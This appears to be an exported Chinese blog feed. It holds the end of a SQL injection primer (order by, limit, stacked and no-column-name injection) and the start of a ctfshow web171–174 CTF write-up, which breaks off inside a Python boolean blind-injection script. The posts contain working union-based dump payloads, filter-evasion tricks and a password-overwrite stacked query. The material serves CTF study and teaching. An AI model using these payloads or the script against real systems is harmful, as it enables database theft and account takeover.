(<span class="keyword">case</span> <span class="keyword">when</span> (<span class="number">3013</span><span class="operator">=</span><span class="number">3014</span>) <span class="keyword">then</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">else</span> (<span class="keyword">select</span> <span class="number">1083</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">9794</span>)<span class="keyword">end</span>))</span><br><span class="line">(<span class="keyword">select</span> (<span class="keyword">case</span> <span class="keyword">when</span> (<span class="number">3013</span><span class="operator">=</span><span class="number">3013</span>) <span class="keyword">then</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">else</span> (<span class="keyword">select</span> <span class="number">1083</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">9794</span>)<span class="keyword">end</span>))</span><br></pre></td></tr></table></figure><p>3）mysql可以使用延时判断,页面响应时间如果延时3秒，那么证明有注入。</p><p>sqlserver数据库延时使用的是waitfor delay</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">if(<span class="number">1</span><span class="operator">=</span><span class="number">1</span>,sleep(<span class="number">3</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>4）如果返回报错，可以直接看报错信息是否存在注入点</p><h5 id="注入方法"><a href="#注入方法" class="headerlink" title="注入方法"></a>注入方法</h5><p>由上面执行顺序可知order by在union顺序之后，因此不能使用union语句来实现order注入</p><blockquote><p>order by后面可以跟if(),case when else这样的复合查询语句。可以用来进行bool注入，延时注入等</p><p>order by后面可以接数字，字段名，这个可以用来判断是否存在注入以及字段数。</p></blockquote><h4 id="limit注入"><a href="#limit注入" class="headerlink" title="limit注入"></a>limit注入</h4><h5 id="语法-3"><a href="#语法-3" class="headerlink" title="语法"></a>语法</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column1, column2, ...</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line">LIMIT (offset_value), number_of_rows;</span><br><span class="line">offset_value:起始列位置(可选)</span><br><span class="line">number_of_rows:限制的列数</span><br></pre></td></tr></table></figure><h5 id="注入方法-1"><a href="#注入方法-1" class="headerlink" title="注入方法"></a>注入方法</h5><p>1）limit前面没有order by时，后面可以跟union，如果存在order by，则不能使用union。</p><p>2）limit后面不能直接跟select语句和if语句。可以跟procedure语句，值得注意的是只有在5.0.0&lt; MySQL &lt;5.6.6版本才可以使用，procedure后面支持报错注入以及时间盲注</p><p>3）limit 关键字后面还可跟PROCEDURE和 INTO两个关键字，但是 INTO 后面写入文件需要知道绝对路径以及写入shell的权限，因此利用比较难。</p><h5 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">procedure</span> analyse()(用于报错注入或时间盲注)</span><br><span class="line">示例</span><br><span class="line"><span class="keyword">procedure</span> analyse(extractvalue(rand(),concat(<span class="number">0x3a</span>,database())),<span class="number">1</span>);</span><br><span class="line"><span class="keyword">procedure</span> analyse(if(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="number">99</span>)),benchmark(<span class="number">2000000</span>,MD5(<span class="string">&#x27;test&#x27;</span>)),benchmark(<span class="number">2000</span>,MD5(<span class="string">&#x27;test&#x27;</span>)))</span><br></pre></td></tr></table></figure><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p><strong>通过添加一个新的查询或者终止查询( ; )，可以达到修改数据和调用存储过程的目的</strong></p><blockquote><p>在我们的Web系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生的错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。因此，在读取数据时，我们建议使用union（联合）注入。同时在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的，例如表名，列名等信息。</p></blockquote><p>比如在对username进行注入时，构造payload如下(已知表名为ctfshow_web,列名为password)</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">admin;updata ctfshow_web <span class="keyword">set</span> password<span class="operator">=</span><span class="number">1</span>; #进行查询后将用户密码设为<span class="number">1</span>，下次即可直接用<span class="number">1</span>登录</span><br></pre></td></tr></table></figure><h3 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h3><p>在过滤了or时，就相当于过滤了information_schema，因此不能正常注入，才有了无列名注入</p><p>参考<a href="https://www.cnblogs.com/phant0m/articles/16450646.html">无列名注入姿势总结 - phant0m1 - 博客园</a></p><h4 id="含表名集合的表"><a href="#含表名集合的表" class="headerlink" title="含表名集合的表"></a>含表名集合的表</h4><p>除了<code>information_schema.tables</code>,还有以下库或视图中含有表名信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql：</span><br><span class="line">mysql.innodb_table_stats</span><br><span class="line">mysql.innodb_index_stats</span><br><span class="line"></span><br><span class="line">sys：</span><br><span class="line">x$schema_table_statistics_with_buffer</span><br><span class="line">schema_table_statistics_with_buffer</span><br><span class="line"></span><br><span class="line">视图：</span><br><span class="line">schema_auto_increment_columns</span><br><span class="line"></span><br><span class="line">payload:</span><br><span class="line">select group_concat(table_name) from mysql.innodb_table_stats|mysql.innodb_index_stats|等等</span><br></pre></td></tr></table></figure><h4 id="别名代替列名"><a href="#别名代替列名" class="headerlink" title="别名代替列名"></a>别名代替列名</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+-------+------+--------------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> name  <span class="operator">|</span> age  <span class="operator">|</span> email        <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+-------+------+--------------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> lihua <span class="operator">|</span>   <span class="number">18</span> <span class="operator">|</span> <span class="number">12345</span><span class="variable">@qq</span>.com <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">2</span> <span class="operator">|</span> bob   <span class="operator">|</span>   <span class="number">12</span> <span class="operator">|</span> <span class="number">54321</span><span class="variable">@qq</span>.com <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">3</span> <span class="operator">|</span> kali  <span class="operator">|</span>   <span class="number">13</span> <span class="operator">|</span> <span class="number">13579</span><span class="variable">@qq</span>.com <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+-------+------+--------------+</span></span><br></pre></td></tr></table></figure><p>利用union注入的数据来替代列名</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">---+-------+------+--------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span> <span class="operator">|</span> <span class="number">2</span>     <span class="operator">|</span> <span class="number">3</span>    <span class="operator">|</span> <span class="number">4</span>            <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---+-------+------+--------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span> <span class="operator">|</span> <span class="number">2</span>     <span class="operator">|</span>    <span class="number">3</span> <span class="operator">|</span> <span class="number">4</span>            <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span> <span class="operator">|</span> lihua <span class="operator">|</span>   <span class="number">18</span> <span class="operator">|</span> <span class="number">12345</span><span class="variable">@qq</span>.com <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2</span> <span class="operator">|</span> bob   <span class="operator">|</span>   <span class="number">12</span> <span class="operator">|</span> <span class="number">54321</span><span class="variable">@qq</span>.com <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">3</span> <span class="operator">|</span> kali  <span class="operator">|</span>   <span class="number">13</span> <span class="operator">|</span> <span class="number">13579</span><span class="variable">@qq</span>.com <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---+-------+------+--------------+</span></span><br></pre></td></tr></table></figure><p>利用别名替代列名</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> `<span class="number">1</span>` <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span>)a;#注意<span class="number">1</span>的`号</span><br><span class="line"><span class="operator">+</span><span class="comment">---+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">3</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---+</span></span><br><span class="line"></span><br><span class="line">如果`被ban了也可以用别名绕过</span><br><span class="line"><span class="keyword">select</span> group_concat(b) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">as</span> b,<span class="number">2</span> <span class="keyword">as</span> c,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span>)a;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+</span></span><br><span class="line"><span class="operator">|</span> group_concat(b) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>         <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+</span></span><br></pre></td></tr></table></figure><p>即实现了在未知列名的情况下仍然可以通过别名来查询表内数据</p><h4 id="join爆列名"><a href="#join爆列名" class="headerlink" title="join爆列名"></a>join爆列名</h4><p>通过使用别名时如果有相同列名会报错来回显出列名</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+-------+------+--------------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> name  <span class="operator">|</span> age  <span class="operator">|</span> email        <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+-------+------+--------------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> lihua <span class="operator">|</span>   <span class="number">18</span> <span class="operator">|</span> <span class="number">12345</span><span class="variable">@qq</span>.com <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">2</span> <span class="operator">|</span> bob   <span class="operator">|</span>   <span class="number">12</span> <span class="operator">|</span> <span class="number">54321</span><span class="variable">@qq</span>.com <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">3</span> <span class="operator">|</span> kali  <span class="operator">|</span>   <span class="number">13</span> <span class="operator">|</span> <span class="number">13579</span><span class="variable">@qq</span>.com <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+-------+------+--------------+</span></span><br></pre></td></tr></table></figure><p>如果是从user表中用别名join后再去union查询，就会报错</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">as</span> a <span class="keyword">join</span> <span class="keyword">user</span> <span class="keyword">as</span> b)c;</span><br><span class="line">ERROR <span class="number">1060</span> (<span class="number">42</span>S21): Duplicate <span class="keyword">column</span> name <span class="string">&#x27;id&#x27;</span></span><br></pre></td></tr></table></figure><p>查找下一个列名，using指定了连接字段，因此会报错下一个字段</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">as</span> a <span class="keyword">join</span> <span class="keyword">user</span> <span class="keyword">as</span> b <span class="keyword">using</span>(id))c;</span><br><span class="line">ERROR <span class="number">1060</span> (<span class="number">42</span>S21): Duplicate <span class="keyword">column</span> name <span class="string">&#x27;name&#x27;</span></span><br></pre></td></tr></table></figure><p>以此类推</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#查找第一个列名</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 表名 <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 表名 <span class="keyword">as</span> a <span class="keyword">join</span> 表名 <span class="keyword">as</span> b)c;</span><br><span class="line">#查找下一个列名</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 表名 <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 表名 <span class="keyword">as</span> a <span class="keyword">join</span> 表名 <span class="keyword">as</span> b <span class="keyword">using</span>(上一个列名))c;</span><br></pre></td></tr></table></figure><h4 id="字符比较查询"><a href="#字符比较查询" class="headerlink" title="字符比较查询"></a>字符比较查询</h4><p>在查询中对于不同长度的字符串，均是取第一个字符的ascii值进行比较，成立返回1，不成立返回0</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> (<span class="keyword">select</span> <span class="string">&#x27;g&#x27;</span>) <span class="operator">&gt;</span> (<span class="keyword">select</span> <span class="string">&#x27;flag&#x27;</span>);#g103 f102</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------+</span></span><br><span class="line"><span class="operator">|</span> (<span class="keyword">select</span> <span class="string">&#x27;g&#x27;</span>) <span class="operator">&gt;</span> (<span class="keyword">select</span> <span class="string">&#x27;flag&#x27;</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------+</span></span><br><span class="line"><span class="operator">|</span>                              <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------+</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> (<span class="keyword">select</span> <span class="string">&#x27;g&#x27;</span>) <span class="operator">&gt;</span> (<span class="keyword">select</span> <span class="string">&#x27;halg&#x27;</span>);#g103 h104</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------+</span></span><br><span class="line"><span class="operator">|</span> (<span class="keyword">select</span> <span class="string">&#x27;g&#x27;</span>) <span class="operator">&gt;</span> (<span class="keyword">select</span> <span class="string">&#x27;halg&#x27;</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------+</span></span><br><span class="line"><span class="operator">|</span>                              <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------+</span></span><br></pre></td></tr></table></figure><p>因此，类似于布尔盲注，可以爆破字符</p><p>先通过以下payload确定列数</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>) <span class="operator">&gt;</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span>);</span><br><span class="line"><span class="keyword">select</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>) <span class="operator">&gt;</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span>);</span><br></pre></td></tr></table></figure><p>再通过以下payload来确定数据</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="operator">||</span>((<span class="keyword">select</span> <span class="number">1</span>,&quot;b&quot;,<span class="number">1</span>,<span class="number">1</span>) <span class="operator">&gt;</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span>));</span><br><span class="line">在mysql5<span class="number">.7</span>版本中，对于返回行数不同的，会自动转换为可比较数据进行比较，因此可以通过结果的真假来找到表中数据</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-web入门-sql注入</title>
      <link href="/2024/12/03/ctfshow-sql%E6%B3%A8%E5%85%A5/"/>
      <url>/2024/12/03/ctfshow-sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="无过滤注入"><a href="#无过滤注入" class="headerlink" title="无过滤注入"></a>无过滤注入</h1><h2 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h2><p>简单的查询语句，结合上方sql查询语句用-1’ or  username &#x3D; ‘flag查询flag</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241203214957279.png"></p><h2 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h2><p>进select中无过滤2进行注入</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241203215654052.png"></p><p>先判断注入类型为字符型，用单引号闭合，再判断回显位置</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241203222441694.png"></p><p>先爆数据库名</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,database()--+</span></span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241203222609888.png" alt="image-20241203222609888"></p><p>爆表名</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>ctfshow_web<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241203222811932.png" alt="image-20241203222811932"></p><p>判断两个可疑表名ctfshow_user和ctfshow_user2</p><p>分别爆列名</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>ctfshow_user<span class="string">&#x27;--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;ctfshow_user2&#x27;</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>发现两个表名下列名均为三个id,username,password</p><p>爆字段</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,password from ctfshow_user where username=&#x27;</span>flag<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure><p>此时提示flag不在该表</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241203225955970.png" alt="image-20241203225955970"></p><p>换另一个表</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,password from ctfshow_user2 where username=&#x27;</span>flag<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241203230100649.png"></p><p>获得flag</p><h2 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173</h2><h3 id="法一-直接注入"><a href="#法一-直接注入" class="headerlink" title="法一:直接注入"></a>法一:直接注入</h3><p>先判断列数为3</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241206183730779.png" alt="image-20241206183730779"></p><p>找回显和库名</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241206184842394.png" alt="image-20241206184842394"></p><p>爆表名</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3--+</span></span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241206185215772.png" alt="image-20241206185215772"></p><p>爆列名</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>ctfshow_user3<span class="string">&#x27;),3--+</span></span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241206203605256.png" alt="image-20241206203605256"></p><p>爆字段</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,(select password from ctfshow_user3 where username=&#x27;</span>flag<span class="string">&#x27;),3--+</span></span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241206203852841.png" alt="image-20241206203852841"></p><p><strong>注意</strong>：该返回逻辑对含有flag的字段进行限制，但是由于只是查找username为flag的项且flag以ctfshow开头未被过滤，如被过滤，可用base64编码或16进制编码后返回</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241206204052004.png" alt="image-20241206204052004"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(!preg_match(&#x27;/flag/i&#x27;, json_encode($ret)))&#123;</span><br><span class="line">     $ret[&#x27;msg&#x27;]=&#x27;查询成功&#x27;;</span><br><span class="line">   &#125;</span><br><span class="line">     </span><br></pre></td></tr></table></figure><p>该代码表示字段中如果不含有flag的大小写 (i表示匹配字段的大小写)，则查询成功</p><hr><h3 id="法二-base64返回"><a href="#法二-base64返回" class="headerlink" title="法二:base64返回"></a>法二:base64返回</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,(select TO_BASE64(password) from ctfshow_user3 where username=&#x27;</span>flag<span class="string">&#x27;),3--+</span></span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241206204841519.png" alt="image-20241206204841519"></p><p>解码结果为</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241206204915208.png" alt="image-20241206204915208"></p><hr><h3 id="法三-十六进制返回"><a href="#法三-十六进制返回" class="headerlink" title="法三:十六进制返回"></a>法三:十六进制返回</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,(select HEX(password) from ctfshow_user3 where username=&#x27;</span>flag<span class="string">&#x27;),3--+</span></span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241206205114568.png" alt="image-20241206205114568"></p><p>解码结果为</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241206205536508.png" alt="image-20241206205536508"></p><hr><h2 id="web174"><a href="#web174" class="headerlink" title="web174"></a>web174</h2><p>照例，先找回显和列数，但是显示无数据，且由返回逻辑可得匹配掉了flag和0-9中的数，即有回显无数据，就使用布尔盲注</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241206210719699.png" alt="image-20241206210719699"></p><hr><h3 id="法一-GET布尔盲注脚本"><a href="#法一-GET布尔盲注脚本" class="headerlink" title="法一:GET布尔盲注脚本"></a>法一:GET布尔盲注脚本</h3><p>使用蒙师傅脚本</p><p><strong>注意</strong>：1.使用http而不是https,否则有ssl证书问题</p><p>​            2.通过提交时抓包找到提交路径即url&#x2F;&#x2F;api&#x2F;v4.php</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment">#GET请求的布尔盲注</span></span><br><span class="line">    <span class="comment">#爆破数据库的长度</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force_database_length</span>(<span class="params">url, headers</span>):</span><br><span class="line">    databaselen = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">        databaselen_payload = <span class="string">f&quot;?id=1&#x27; and length(database())=<span class="subst">&#123;l&#125;</span>--+&quot;</span></span><br><span class="line">        response = requests.get(url + databaselen_payload, headers=headers)  </span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span><span class="keyword">in</span> response.text:<span class="comment">#判断是否存在注入</span></span><br><span class="line">            databaselen = l</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;数据库名字长度为:  &#x27;</span>+ <span class="built_in">str</span>(databaselen))</span><br><span class="line">    <span class="keyword">return</span> databaselen</span><br><span class="line"></span><br><span class="line">    <span class="comment">#爆破数据库的名字</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force_database_name</span>(<span class="params">url, headers, databaselen</span>):</span><br><span class="line">    databasename = <span class="string">&#x27;&#x27;</span>   </span><br><span class="line">    <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,databaselen+<span class="number">1</span>):<span class="comment">#用来爆破数据库的字符</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">            databasechar_payload = <span class="string">f&quot;?id=1&#x27; and ascii(substr(database(),<span class="subst">&#123;l&#125;</span>,1))=&#x27;<span class="subst">&#123;i&#125;</span>&#x27;--+&quot;</span></span><br><span class="line">            response = requests.get(url + databasechar_payload, headers=headers) </span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span><span class="keyword">in</span> response.text:<span class="comment">#判断是否存在注入</span></span><br><span class="line">                databasename += <span class="built_in">chr</span>(i)</span><br><span class="line">                <span class="built_in">print</span>(databasename)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;数据库名字为:  &#x27;</span>+ <span class="built_in">str</span>(databasename))</span><br><span class="line">    <span class="keyword">return</span> databasename</span><br><span class="line"> <span class="comment">#爆破表的个数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force_table_count</span>(<span class="params">url, headers, databasename</span>):</span><br><span class="line">    tablecount = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):<span class="comment">#用来爆破表的个数</span></span><br><span class="line">        tablecount_payload = <span class="string">f&quot;?id=1&#x27; and (select count(table_name) from information_schema.tables where table_schema=&#x27;<span class="subst">&#123;databasename&#125;</span>&#x27;) =<span class="subst">&#123;l&#125;</span>--+&quot;</span></span><br><span class="line">        response = requests.get(url + tablecount_payload, headers=headers) </span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span><span class="keyword">in</span> response.text:<span class="comment">#判断是否存在注入</span></span><br><span class="line">            tablecount = l</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;表的个数为: <span class="subst">&#123;tablecount&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> tablecount</span><br><span class="line"><span class="comment">#爆破表的名字</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force_table_name</span>(<span class="params">url, headers, tablecount,databasename</span>):</span><br><span class="line">    tables=[]</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span 